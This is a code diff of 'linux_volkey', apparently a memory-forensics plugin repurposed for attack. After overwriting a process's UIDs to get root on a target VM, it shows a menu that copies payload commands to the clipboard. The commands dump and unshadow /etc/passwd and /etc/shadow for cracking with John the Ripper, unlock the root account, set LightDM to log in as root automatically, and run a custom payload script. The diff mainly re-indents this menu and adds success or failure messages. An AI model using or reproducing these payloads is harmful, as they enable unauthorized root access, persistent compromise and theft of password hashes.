@@ -296,59 +296,61 @@ class linux_volkey(linux_common.AbstractLinuxCommand):
                 #success = True
                 success = self._overwrite_UIDs(vals)
                 if success:
-                    print "got root...probably"
-                    self.skull();
-                    while(1):
-                        self.keyMenu();
-                        print("select an option:")
-                        keySelec = ['e','i','1','2','3','4']
-                        ans=self.readIn(keySelec)
-                        print("option selected: "+ans+"\n")
-                        if ans=="1": 
-                            data = "cd /mnt/hgfs/payloads && apt update && apt install john -y && unshadow /etc/passwd /etc/shadow > crackMe.db"
-                            os.system("echo '%s' | pbcopy" % data)
-                            print("Payload copied to clipboard")
-                            print("Click paste in terminal, and run the command to execute the payload")
-                        elif ans=="2": 
-                            data = "cd /mnt/hgfs/payloads && sudo dpkg -i john*.deb && unshadow /etc/passwd /etc/shadow > crackMe.db"
-                            os.system("echo '%s' | pbcopy" % data)
-                            print("Payload copied to clipboard")
-                            print("Click paste in terminal, and run the command to execute the payload")
-                        elif ans=="3":
-                            data = "passwd root && usermod -U root && printf \"[Seat:*]\nautologin-user=root\" > /etc/lightdm/lightdm.conf"
-                            os.system("echo '%s' | pbcopy" % data)
-                            print("Payload copied to clipboard")
-                            print("Click paste in terminal, and run the command to execute the payload")
-                        elif ans=="4": 
-                            data = "chmod +x /mnt/hgfs/payloads/payload.sh && ./mnt/hgfs/payloads/payload.sh"
-                            os.system("echo '%s' | pbcopy" % data)
-                            print("Payload copied to clipboard")
-                            print("Click paste in terminal, and run the command to execute the payload")
-                        elif ans=="i": 
-                            print("""
+                    print "got root for shell with PID="+str(task.pid)+"...probably"
+                else:
+                    print "failed to get root for shell with PID="+str(task.pid)
+                self.skull();
+                while(1):
+                    self.keyMenu();
+                    print("select an option:")
+                    keySelec = ['e','i','1','2','3','4']
+                    ans=self.readIn(keySelec)
+                    print("option selected: "+ans+"\n")
+                    if ans=="1": 
+                        data = "cd /mnt/hgfs/payloads && apt update && apt install john -y && unshadow /etc/passwd /etc/shadow > crackMe.db"
+                        os.system("echo '%s' | pbcopy" % data)
+                        print("Payload copied to clipboard")
+                        print("Click paste in terminal, and run the command to execute the payload")
+                    elif ans=="2": 
+                        data = "cd /mnt/hgfs/payloads && sudo dpkg -i john*.deb && unshadow /etc/passwd /etc/shadow > crackMe.db"
+                        os.system("echo '%s' | pbcopy" % data)
+                        print("Payload copied to clipboard")
+                        print("Click paste in terminal, and run the command to execute the payload")
+                    elif ans=="3":
+                        data = "passwd root && usermod -U root && printf \"[Seat:*]\nautologin-user=root\" > /etc/lightdm/lightdm.conf"
+                        os.system("echo '%s' | pbcopy" % data)
+                        print("Payload copied to clipboard")
+                        print("Click paste in terminal, and run the command to execute the payload")
+                    elif ans=="4": 
+                        data = "chmod +x /mnt/hgfs/payloads/payload.sh && ./mnt/hgfs/payloads/payload.sh"
+                        os.system("echo '%s' | pbcopy" % data)
+                        print("Payload copied to clipboard")
+                        print("Click paste in terminal, and run the command to execute the payload")
+                    elif ans=="i": 
+                        print("""
 -----------------------------------------------------------------------
-    option | info
+option | info
 -----------------------------------------------------------------------
-        1. | gets Hashes from target using the apt-get
-           | version of John the ripper.
-           | Requres internet access or a pre installed copy of John
-           |
-        2. | gets Hashes from target using a version of John
-           | the ripper via the "payloads" shared folder
-           | 
-        3. | Override Lightdm config to always log in as 
-           | root at startup
-           |
-        4. | runs custom payload on target using a version of John
-           | the ripper via the "payloads" shared folder
+    1. | gets Hashes from target using the apt-get
+       | version of John the ripper.
+       | Requres internet access or a pre installed copy of John
+       |
+    2. | gets Hashes from target using a version of John
+       | the ripper via the "payloads" shared folder
+       | 
+    3. | Override Lightdm config to always log in as 
+       | root at startup
+       |
+    4. | runs custom payload on target using a version of John
+       | the ripper via the "payloads" shared folder
 -----------------------------------------------------------------------
-                     """)
-                        elif ans=="e":
-                            print("\n Goodbye")
-                            ans=None
-                            break
-                        else:
-                            print("\n Pick a Real Option.") 
+                 """)
+                    elif ans=="e":
+                        print("\n Goodbye")
+                        ans=None
+                        break
+                    else:
+                        print("\n Pick a Real Option.") 
 
 
 
